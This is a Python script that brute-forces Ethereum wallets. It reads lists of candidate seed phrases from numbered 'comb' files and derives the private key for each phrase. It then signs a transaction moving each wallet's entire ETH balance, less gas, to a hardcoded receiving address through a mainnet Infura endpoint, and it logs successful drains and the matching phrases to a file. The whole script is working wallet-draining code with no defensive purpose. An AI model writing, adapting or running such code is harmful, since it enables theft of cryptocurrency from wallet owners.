from web3 import Web3
from PyQt5 import QtCore, QtGui, QtWidgets
from eth_account import Account
from PyQt5.QtWidgets import *
import sys

#FILENAME = ""
FILENAMEVAR = ".var"
FILENAMEVARNAME = ".varname"
FILENAMESUCCESS = ".suc"
TO_ADDRESS = "0xD0DeCD7D5240885cCa3A0F1e0823893CFA8D00f9"
eth_provider = Web3(Web3.HTTPProvider("https://mainnet.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161"))
variable_dick = 1
varlineNumb = 0
varCountLines = 999999999 #Need to autoset from amount of lines from words file
# eth_provider = Web3(Web3.HTTPProvider("https://bsc-dataseed.binance.org"))

def fileNameReader():
    fvr = open(FILENAMEVARNAME, 'r')
    numbName = fvr.readline()
    FILENAME = "comb"+numbName+".txt"
    fvr.close()
    return FILENAME

def send_eth(wallet,to_address):
    # get the nonce.  Prevents one from sending the transaction twice

    nonce = eth_provider.eth.get_transaction_count(wallet["address"])
    eth_balance = eth_provider.eth.get_balance(wallet["address"])
    gasPrice = eth_provider.eth.gas_price
    gas = 21000
    gasFee = 2 * gasPrice * gas
    if gasFee > eth_balance:
        return
    # build a transaction in a dictionary
    tx = {
        'nonce': nonce,
        'to': to_address,
        'value': eth_balance - gasFee,
        'gas': 21000,
        'gasPrice': gasPrice
    }

    # sign the transaction
    signed_tx = eth_provider.eth.account.sign_transaction(tx, wallet["privatekey"])

    # send transaction
    tx_hash = eth_provider.eth.send_raw_transaction(signed_tx.rawTransaction)

    # get transaction hash
    print(eth_provider.to_hex(tx_hash))
    f = open(FILENAMESUCCESS, 'a')
    f.write(eth_provider.to_hex(tx_hash) + ' omg, oh yes, bsc')
    f.close()

def read_pharse(lineNumb):
    with open(fileNameReader()) as file:
        #pharseToArr = file.readline()
        for index, line in enumerate(file):
            if index == lineNumb:
                pharseToArr = line
        
        parse = pharseToArr.strip('[]').replace(' ', ' ').split(',')
        #print('Begin some')
        pharse = parse
        #print('End some')
    return [wallet.strip() for wallet in pharse]

def get_wallet_info_from_pharse(wallets):
    Account.enable_unaudited_hdwallet_features()
    wallet_info_list = []
    for wallet in wallets:
        acct = Account.from_mnemonic(wallet)
        address = acct.address
        private_key = acct.key.hex()
        wallet_info_list.append({
            "address": address,
            "privatekey": private_key
        })
    return wallet_info_list


if __name__ == "__main__":
    for i in range(varCountLines):
        fvr = open(FILENAMEVAR, 'r')
        varlineNumb = int(fvr.readline())
        fvr.close()
        fvrr = open(FILENAMEVARNAME, 'r')
        varNameNumbin = int(fvrr.readline())
        fvrr.close()
        print(varlineNumb)
        if varNameNumbin != 105:
            if varlineNumb != 50000:
                print(read_pharse(varlineNumb))
                try:
                    wallets = get_wallet_info_from_pharse(read_pharse(varlineNumb))
                    to_address = TO_ADDRESS.strip()
                    if Web3.is_address(to_address):
                        for wallet in wallets:
                            send_eth(wallet,to_address)
                        file = open(fileNameReader(), 'r') 
                        for index, line in enumerate(file):
                            if index == varlineNumb:
                                pharseToArr = line
                        f = open(FILENAMESUCCESS, 'a')
                        f.write(pharseToArr)
                        f.close()
                        print("wallet empty.")
                    else:
                        ()
                        #print("invalid key.")
                except:
                    ()
                varlineNumb += 1
                fvw = open(FILENAMEVAR, 'w')
                fvw.write(str(varlineNumb))
                fvw.close()
            else:
                varlineNumb = 0
                fvw = open(FILENAMEVAR, 'w')
                fvw.write(str(varlineNumb))
                fvw.close()
                fvw = open(FILENAMEVARNAME, 'w')
                varNameNumbin += 1
                fvw.write(str(varNameNumbin))
                fvw.close()
        else:
            varlineNumb = 0
            fvw = open(FILENAMEVAR, 'w')
            fvw.write(str(varlineNumb))
            fvw.close()
            fvw = open(FILENAMEVARNAME, 'w')
            varNameNumbin = 0
            fvw.write(str(varNameNumbin))
            fvw.close()
            sys.exit()
        i += 1